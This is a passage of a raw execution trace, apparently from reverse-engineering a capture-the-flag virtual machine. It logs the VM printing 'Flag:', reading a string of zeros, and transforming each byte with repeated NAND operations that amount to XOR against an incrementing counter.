v14 = v1[261] (t)
c = v14
output:
tv15 = &amp;v1[256] (6)
--*v15
dword_6010A4++
v14 = v1[262] ( )
c = v14
output:
 v15 = &amp;v1[256] (5)
--*v15
dword_6010A4++
v14 = v1[263] (F)
c = v14
output:
Fv15 = &amp;v1[256] (4)
--*v15
dword_6010A4++
v14 = v1[264] (l)
c = v14
output:
lv15 = &amp;v1[256] (3)
--*v15
dword_6010A4++
v14 = v1[265] (a)
c = v14
output:
av15 = &amp;v1[256] (2)
--*v15
dword_6010A4++
v14 = v1[266] (g)
c = v14
output:
gv15 = &amp;v1[256] (1)
--*v15
dword_6010A4++
v14 = v1[267] (:)
c = v14
output:
:v15 = &amp;v1[256] (0)
v10 =v1[67] (272)
dword_6010A4 = v10
dword_6010A4++
input:
00000000000000000000000000000000000000
c = v14
v8 = dword_6010A4
v12 = c
v1[273] = v12 (48)
v15 = &amp;v1[272] (31)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[274] = v12 (48)
v15 = &amp;v1[272] (30)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[275] = v12 (48)
v15 = &amp;v1[272] (29)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[276] = v12 (48)
v15 = &amp;v1[272] (28)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[277] = v12 (48)
v15 = &amp;v1[272] (27)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[278] = v12 (48)
v15 = &amp;v1[272] (26)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[279] = v12 (48)
v15 = &amp;v1[272] (25)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[280] = v12 (48)
v15 = &amp;v1[272] (24)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[281] = v12 (48)
v15 = &amp;v1[272] (23)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[282] = v12 (48)
v15 = &amp;v1[272] (22)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[283] = v12 (48)
v15 = &amp;v1[272] (21)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[284] = v12 (48)
v15 = &amp;v1[272] (20)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[285] = v12 (48)
v15 = &amp;v1[272] (19)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[286] = v12 (48)
v15 = &amp;v1[272] (18)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[287] = v12 (48)
v15 = &amp;v1[272] (17)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[288] = v12 (48)
v15 = &amp;v1[272] (16)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[289] = v12 (48)
v15 = &amp;v1[272] (15)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[290] = v12 (48)
v15 = &amp;v1[272] (14)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[291] = v12 (48)
v15 = &amp;v1[272] (13)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[292] = v12 (48)
v15 = &amp;v1[272] (12)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[293] = v12 (48)
v15 = &amp;v1[272] (11)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[294] = v12 (48)
v15 = &amp;v1[272] (10)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[295] = v12 (48)
v15 = &amp;v1[272] (9)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[296] = v12 (48)
v15 = &amp;v1[272] (8)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[297] = v12 (48)
v15 = &amp;v1[272] (7)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[298] = v12 (48)
v15 = &amp;v1[272] (6)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[299] = v12 (48)
v15 = &amp;v1[272] (5)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[300] = v12 (48)
v15 = &amp;v1[272] (4)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[301] = v12 (48)
v15 = &amp;v1[272] (3)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[302] = v12 (48)
v15 = &amp;v1[272] (2)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[303] = v12 (48)
v15 = &amp;v1[272] (1)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[304] = v12 (48)
v15 = &amp;v1[272] (0)
v14 = v1[320] ( )
c = v14
v10 = c(32)
dword_6010A4 = v10
v13 = v1[92] (32)
c += v13
v6 = c
v14 = v1[273] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 32 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] ( )
c = v14
dword_6010A4 = -33 ; c = 32
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-1)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -1
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (16)
v14 = v1[320] ( )
c = v14
v13 = v1[150] (32)
c += v13
v10 = c(273)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[273] = v12 (16)
v10 = v1[320] (32)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (33)
v15 = &amp;v1[325] (31)
--*v15
v14 = v1[320] (!)
c = v14
v10 = c(33)
dword_6010A4 = v10
v13 = v1[92] (33)
c += v13
v6 = c
v14 = v1[274] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (!)
c = v14
dword_6010A4 = -33 ; c = 33
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-2)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -2
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (17)
v14 = v1[320] (!)
c = v14
v13 = v1[150] (33)
c += v13
v10 = c(274)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[274] = v12 (17)
v10 = v1[320] (33)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (34)
v15 = &amp;v1[325] (30)
--*v15
v14 = v1[320] (&quot;)
c = v14
v10 = c(34)
dword_6010A4 = v10
v13 = v1[92] (34)
c += v13
v6 = c
v14 = v1[275] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 34 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (&quot;)
c = v14
dword_6010A4 = -33 ; c = 34
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-3)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -3
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (18)
v14 = v1[320] (&quot;)
c = v14
v13 = v1[150] (34)
c += v13
v10 = c(275)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[275] = v12 (18)
v10 = v1[320] (34)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (35)
v15 = &amp;v1[325] (29)
--*v15
v14 = v1[320] (#)
c = v14
v10 = c(35)
dword_6010A4 = v10
v13 = v1[92] (35)
c += v13
v6 = c
v14 = v1[276] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 35 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (#)
c = v14
dword_6010A4 = -33 ; c = 35
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-4)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -4
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (19)
v14 = v1[320] (#)
c = v14
v13 = v1[150] (35)
c += v13
v10 = c(276)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[276] = v12 (19)
v10 = v1[320] (35)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (36)
v15 = &amp;v1[325] (28)
--*v15
v14 = v1[320] ($)
c = v14
v10 = c(36)
dword_6010A4 = v10
v13 = v1[92] (36)
c += v13
v6 = c
v14 = v1[277] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 36 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] ($)
c = v14
dword_6010A4 = -33 ; c = 36
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-5)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -5
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (20)
v14 = v1[320] ($)
c = v14
v13 = v1[150] (36)
c += v13
v10 = c(277)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[277] = v12 (20)
v10 = v1[320] (36)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (37)
v15 = &amp;v1[325] (27)
--*v15
v14 = v1[320] (%)
c = v14
v10 = c(37)
dword_6010A4 = v10
v13 = v1[92] (37)
c += v13
v6 = c
v14 = v1[278] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 37 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (%)
c = v14
dword_6010A4 = -33 ; c = 37
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-6)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -6
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (21)
v14 = v1[320] (%)
c = v14
v13 = v1[150] (37)
c += v13
v10 = c(278)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[278] = v12 (21)
v10 = v1[320] (37)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (38)
v15 = &amp;v1[325] (26)
--*v15
v14 = v1[320] (&amp;)
c = v14
v10 = c(38)
dword_6010A4 = v10
v13 = v1[92] (38)
c += v13
v6 = c
v14 = v1[279] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 38 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (&amp;)
c = v14
dword_6010A4 = -33 ; c = 38
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-7)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -7
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (22)
v14 = v1[320] (&amp;)
c = v14
v13 = v1[150] (38)
c += v13
v10 = c(279)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[279] = v12 (22)
v10 = v1[320] (38)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (39)
v15 = &amp;v1[325] (25)
--*v15
v14 = v1[320] (&#39;)
c = v14
v10 = c(39)
dword_6010A4 = v10
v13 = v1[92] (39)
c += v13
v6 = c
v14 = v1[280] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 39 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (&#39;)
c = v14
dword_6010A4 = -33 ; c = 39
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-8)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -8
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (23)
v14 = v1[320] (&#39;)
c = v14
v13 = v1[150] (39)
c += v13
v10 = c(280)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[280] = v12 (23)
v10 = v1[320] (39)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (40)
v15 = &amp;v1[325] (24)
--*v15
v14 = v1[320] (()
c = v14
v10 = c(40)
dword_6010A4 = v10
v13 = v1[92] (40)
c += v13
v6 = c
v14 = v1[281] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 40 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (()
c = v14
dword_6010A4 = -33 ; c = 40
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-9)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -9
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (24)
v14 = v1[320] (()
c = v14
v13 = v1[150] (40)
c += v13
v10 = c(281)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[281] = v12 (24)
v10 = v1[320] (40)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (41)
v15 = &amp;v1[325] (23)
--*v15
v14 = v1[320] ())
c = v14
v10 = c(41)
dword_6010A4 = v10
v13 = v1[92] (41)
c += v13
v6 = c
v14 = v1[282] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 41 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] ())
c = v14
dword_6010A4 = -33 ; c = 41
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-10)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -10
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (25)
v14 = v1[320] ())
c = v14
v13 = v1[150] (41)
c += v13
v10 = c(282)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[282] = v12 (25)
v10 = v1[320] (41)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (42)
v15 = &amp;v1[325] (22)
--*v15
v14 = v1[320] (*)
c = v14
v10 = c(42)
dword_6010A4 = v10
v13 = v1[92] (42)
c += v13
v6 = c
v14 = v1[283] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 42 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (*)
c = v14
dword_6010A4 = -33 ; c = 42
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-11)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -11
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (26)
v14 = v1[320] (*)
c = v14
v13 = v1[150] (42)
c += v13
v10 = c(283)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[283] = v12 (26)
v10 = v1[320] (42)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (43)
v15 = &amp;v1[325] (21)
--*v15
v14 = v1[320] (+)
c = v14
v10 = c(43)
dword_6010A4 = v10
v13 = v1[92] (43)
c += v13
v6 = c
v14 = v1[284] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 43 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (+)
c = v14
dword_6010A4 = -33 ; c = 43
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-12)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -12
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (27)
v14 = v1[320] (+)
c = v14
v13 = v1[150] (43)
c += v13
v10 = c(284)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[284] = v12 (27)
v10 = v1[320] (43)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (44)
v15 = &amp;v1[325] (20)
--*v15
v14 = v1[320] (,)
c = v14
v10 = c(44)
dword_6010A4 = v10
v13 = v1[92] (44)
c += v13
v6 = c
v14 = v1[285] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 44 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (,)
c = v14
dword_6010A4 = -33 ; c = 44
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-13)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -13
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (28)
v14 = v1[320] (,)
c = v14
v13 = v1[150] (44)
c += v13
v10 = c(285)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[285] = v12 (28)
v10 = v1[320] (44)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (45)
v15 = &amp;v1[325] (19)
--*v15
v14 = v1[320] (-)
c = v14
v10 = c(45)
dword_6010A4 = v10
v13 = v1[92] (45)
c += v13
v6 = c
v14 = v1[286] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 45 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (-)
c = v14
dword_6010A4 = -33 ; c = 45
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-14)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -14
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (29)
v14 = v1[320] (-)
c = v14
v13 = v1[150] (45)
c += v13
v10 = c(286)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[286] = v12 (29)
v10 = v1[320] (45)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (46)
v15 = &amp;v1[325] (18)
--*v15
v14 = v1[320] (.)
c = v14
v10 = c(46)
dword_6010A4 = v10
v13 = v1[92] (46)
c += v13
v6 = c
v14 = v1[287] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 46 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (.)
c = v14
dword_6010A4 = -33 ; c = 46
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-15)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -15
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (30)
v14 = v1[320] (.)
c = v14
v13 = v1[150] (46)
c += v13
v10 = c(287)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[287] = v12 (30)
v10 = v1[320] (46)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (47)
v15 = &amp;v1[325] (17)
--*v15
v14 = v1[320] (/)
c = v14
v10 = c(47)
dword_6010A4 = v10
v13 = v1[92] (47)
c += v13
v6 = c
v14 = v1[288] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 47 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (/)
c = v14
dword_6010A4 = -33 ; c = 47
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-16)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -16
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (31)
v14 = v1[320] (/)
c = v14
v13 = v1[150] (47)
c += v13
v10 = c(288)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[288] = v12 (31)
v10 = v1[320] (47)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (48)
v15 = &amp;v1[325] (16)
--*v15
v14 = v1[320] (0)
c = v14
v10 = c(48)
dword_6010A4 = v10
v13 = v1[92] (48)
c += v13
v6 = c
v14 = v1[289] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 48 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-1)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -1
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (0)
v14 = v1[320] (0)
c = v14
v13 = v1[150] (48)
c += v13
v10 = c(289)
dword_6010A4 = v10
v14 = v1[324] ( )
c = v14
v8 = dword_6010A4
v12 = c
v1[289] = v12 (0)
v10 = v1[320] (48)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (49)
v15 = &amp;v1[325] (15)
--*v15
v14 = v1[320] (1)
c = v14
v10 = c(49)
dword_6010A4 = v10
v13 = v1[92] (49)
c += v13
v6 = c
v14 = v1[290] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
